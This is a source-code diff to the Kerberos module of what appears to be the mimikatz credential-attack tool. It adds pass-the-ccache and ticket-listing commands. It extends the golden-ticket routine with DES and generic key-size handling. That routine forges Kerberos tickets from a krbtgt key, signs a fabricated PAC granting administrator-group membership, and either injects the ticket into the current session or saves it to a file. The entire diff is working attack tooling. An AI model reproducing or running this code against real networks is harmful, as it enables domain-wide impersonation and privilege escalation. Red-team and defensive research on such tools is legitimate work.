@@ -22,6 +22,8 @@ const KUHL_M_C kuhl_m_c_kerberos[] = {
 	{kuhl_m_kerberos_decode,	L"decrypt",		L"Decrypt encoded ticket"},
 	{kuhl_m_kerberos_pac_info,	L"pacinfo",		L"Some infos on PAC file"},
 #endif
+	{kuhl_m_kerberos_ccache_ptc,	L"ptc",		L"Pass-the-ccache [NT6]"},
+	{kuhl_m_kerberos_ccache_list,	L"clist",	L"List tickets in MIT/Heimdall ccache"},
 };
 
 const KUHL_M kuhl_m_kerberos = {
@@ -131,7 +133,7 @@ NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
 	DWORD submitSize, responseSize;
 	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
 	PVOID dumPtr;
-
+	
 	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
 	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
 	{
@@ -206,8 +208,8 @@ NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
 			kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
 			kuhl_m_kerberos_ticket_display(&kiwiTicket, FALSE);
 			
-			for(i = 0; !isNull && (i < kiwiTicket.Ticket.Length); i++);
-				isNull |= !kiwiTicket.Ticket.Value[i];
+			for(i = 0; !isNull && (i < kiwiTicket.Key.Length); i++)
+				isNull |= !kiwiTicket.Key.Value[i];
 			if(isNull)
 				kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");
 
@@ -312,14 +314,16 @@ GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAU
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500, keyType, keyLen, App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey, szId, szGroups, szLifetime, base, filename;
+	DWORD i, j, nbGroups, id = 500, keyType, /*keyLen,*/ App_KrbCredSize;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szLifetime, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
-		
+	NTSTATUS status;
+	PKERB_ECRYPT pCSystem;
+
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");
 
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
@@ -330,37 +334,14 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 			{
 				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 				{
-					if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
-					{
+					if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
+						keyType = KERB_ETYPE_DES_CBC_MD5;
+					else if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
 						keyType = KERB_ETYPE_RC4_HMAC_NT;
-						keyLen = LM_NTLM_HASH_LENGTH;
-					}
 					else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
-					{
-						if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
-						{
-							keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
-							keyLen = AES_128_KEY_LENGTH;
-						}
-						else
-						{
-							szKey = NULL;
-							PRINT_ERROR(L"aes128 only supported on NT6 or >\n");
-						}
-					}
+						keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
 					else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
-					{
-						if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
-						{
-							keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
-							keyLen = AES_256_KEY_LENGTH;
-						}
-						else
-						{
-							szKey = NULL;
-							PRINT_ERROR(L"aes256 only supported on NT6 or >\n");
-						}
-					}
+						keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
 					
 					if(szKey)
 					{
@@ -401,56 +382,61 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							groups = defaultGroups;
 							nbGroups = ARRAYSIZE(defaultGroups);
 						}
-
-						if(kull_m_string_stringToHex(szKey, key, keyLen))
+						
+						status = CDLocateCSystem(keyType, &pCSystem);
+						if(NT_SUCCESS(status))
 						{
-							kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
-							GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
-							*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
-							lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
-							kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
-							*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
-							kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
-							*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+							if(kull_m_string_stringToHex(szKey, key, pCSystem->KeySize))
+							{
+								kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
+								GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
+								*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
+								lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
+								kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
+								*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+								kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
+								*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
 
-							kprintf(
-								L"User      : %s\n"
-								L"Domain    : %s\n"
-								L"SID       : %s\n"
-								L"User Id   : %u\n", szUser, szDomain, szSid, id);
-							kprintf(L"Groups Id : *");
-							for(i = 0; i < nbGroups; i++)
-								kprintf(L"%u ", groups[i]);
-							kprintf(L"\nServiceKey: ");
-							kull_m_string_wprintf_hex(key, keyLen, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
-							if(szService)
-								kprintf(L"Service   : %s\n", szService);
-							if(szTarget)
-								kprintf(L"Target    : %s\n", szTarget);
-							kprintf(L"Lifetime  : ");
+								kprintf(
+									L"User      : %s\n"
+									L"Domain    : %s\n"
+									L"SID       : %s\n"
+									L"User Id   : %u\n", szUser, szDomain, szSid, id);
+								kprintf(L"Groups Id : *");
+								for(i = 0; i < nbGroups; i++)
+									kprintf(L"%u ", groups[i]);
+								kprintf(L"\nServiceKey: ");
+								kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
+								if(szService)
+									kprintf(L"Service   : %s\n", szService);
+								if(szTarget)
+									kprintf(L"Target    : %s\n", szTarget);
+								kprintf(L"Lifetime  : ");
 								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
 								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
 								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
-							
-							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, keyLen, keyType, id, groups, nbGroups))
-							{
-								App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
-								if(isPtt)
+								kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
+
+								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups))
 								{
-									if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
-										kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
-								}
-								else if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, App_KrbCredSize))
-									kprintf(L"\nFinal Ticket Saved to file !\n");
-								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+									App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
+									if(isPtt)
+									{
+										if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
+											kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
+									}
+									else if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, App_KrbCredSize))
+										kprintf(L"\nFinal Ticket Saved to file !\n");
+									else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
 
-								LocalFree(App_KrbCred);
+									LocalFree(App_KrbCred);
+								}
+								else PRINT_ERROR(L"KrbCred error\n");
 							}
-							else PRINT_ERROR(L"KrbCred error\n");
+							else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
 						}
-						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes) for RC4/AES128 or 64 (32 bytes) for AES256\n");
+						else PRINT_ERROR(L"Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6\n", keyType, status);
 					}
 					else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
 
@@ -475,6 +461,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	NTSTATUS status;
 	PKERB_ECRYPT pCSystem;
 	PVOID pContext;
+	DWORD modulo;
 
 	status = CDLocateCSystem(eType, &pCSystem);
 	if(NT_SUCCESS(status))
@@ -482,7 +469,13 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 		status = pCSystem->Initialize(key, keySize, keyUsage, &pContext);
 		if(NT_SUCCESS(status))
 		{
-			*outputSize = encrypt ? (dataSize + pCSystem->Size) : dataSize;
+			*outputSize = dataSize;
+			if(encrypt)
+			{
+				if(modulo = *outputSize % pCSystem->BlockSize)
+					*outputSize += pCSystem->BlockSize - modulo;
+				*outputSize += pCSystem->Size;
+			}
 			if(*output = LocalAlloc(LPTR, *outputSize))
 			{
 				status = encrypt ? pCSystem->Encrypt(pContext, data, dataSize, *output, outputSize) : pCSystem->Decrypt(pContext, data, dataSize, *output, outputSize);
@@ -555,6 +548,9 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
 		SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
 		break;
+	case KERB_ETYPE_DES_CBC_MD5:
+		SignatureType = KERB_CHECKSUM_DES_MAC;
+		break;
 	case KERB_ETYPE_RC4_HMAC_NT:
 	default:
 		SignatureType = KERB_CHECKSUM_HMAC_MD5;
@@ -563,7 +559,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, &pacType, &pacTypeSize))
 	{
 		kprintf(L" * PAC generated\n");
-		status = kuhl_m_pac_signature(pacType, pacTypeSize, key, keySize);
+		status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
 		if(NT_SUCCESS(status))
 		{
 			kprintf(L" * PAC signed\n");
@@ -574,7 +570,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 				if(NT_SUCCESS(status))
 				{
 					kprintf(L" * EncTicketPart encrypted\n");
-					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket))
+					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
 						kprintf(L" * KrbCred generated\n");
 				}
 				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
